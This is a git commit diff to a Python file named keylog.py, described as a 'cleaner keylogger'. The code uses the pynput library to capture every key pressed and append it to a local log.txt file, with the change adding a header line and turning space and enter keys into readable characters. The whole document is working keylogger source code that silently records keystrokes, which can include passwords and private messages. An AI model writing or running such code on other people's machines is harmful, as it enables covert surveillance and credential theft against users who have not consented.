48ce9dd9f6ba63e202770e71ad5911882893db88
aakashkrsingh1 <aakashkrsingh1@gmail.com>
2020-05-09 12:55:43 +0530

    cleaner keylogger implemented

--- keylog.py
+++ keylog.py
@@ -1,10 +1,20 @@
 from pynput.keyboard import Listener
 
+import datetime
+with open("log.txt", 'a') as g:
+    g.write(" LOGGING DATE AND TIME")
+
 def write_of_file(key):
     keydata =str(key)
+    if keydata=='Key.space':
+        keydata =' '
+    if keydata=='Key.enter':
+        keydata ='\n'    
+    
     with open ("log.txt", 'a')     as f:
         f.write(keydata)
     
     
 with Listener(on_press=write_of_file) as l:
         l.join()
+
